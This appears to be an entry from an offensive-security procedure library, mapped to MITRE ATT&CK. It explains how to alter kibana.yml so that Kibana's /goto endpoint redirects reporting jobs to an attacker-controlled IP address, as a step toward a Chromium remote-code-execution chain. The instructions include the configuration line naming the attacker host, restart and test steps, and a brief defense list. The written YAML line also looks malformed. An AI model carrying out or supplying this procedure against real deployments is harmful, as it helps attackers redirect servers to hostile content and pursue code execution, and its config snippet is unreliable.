---
id: proc-config-open-redirect
tags:
  - open-redirect
  - kibana-config
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/configure-custom-response-headers]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:23:37.240Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Configure-Kibana-for-Open-Redirect-Abuse

## Summary

This procedure modifies Kibana's configuration to override the Location header on the /goto endpoint, enabling redirection of reporting jobs to arbitrary attacker URLs, chaining to the Chromium RCE.

## Description

Kibana's /goto allows custom redirects, but without validation, customResponseHeaders in kibana.yml can force redirects to malicious pages. This abuses the reporting feature to load external content in Chromium. Restart Kibana after config change. Requires file system access to kibana.yml.

## Requirements

1. Access to edit kibana.yml.
2. Kibana service restart capability.
3. Attacker URL ready (e.g., http://13.53.201.208:8080).

## Defense

Defensive measures and detection strategies:

- Validate and sanitize redirect URLs in configs.
- Disable custom response headers or use strict CSP.
- Audit kibana.yml changes and monitor /goto accesses.

## Objectives

1. Enable arbitrary redirects in reporting.
2. Chain to RCE payload loading.
3. Bypass URL validation in jobs.

## Instructions

### Step 1: Edit Config

**Context**: Add custom header to force redirect on /goto.

**Command** ([[commands/configure-custom-response-headers]]):
```yaml
server.customResponseHeaders: Location: "http://13.53.201.208:8080"
```

> Append to kibana.yml. Expected output: Config saved; restart Kibana to apply.

### Step 2: Restart and Test

**Context**: Apply changes and verify redirect.

Restart Kibana service, then test /goto?path=... in browser; should redirect to attacker URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/configure-custom-response-headers]]

## Tools Used


## Tags

- open-redirect
- kibana-config
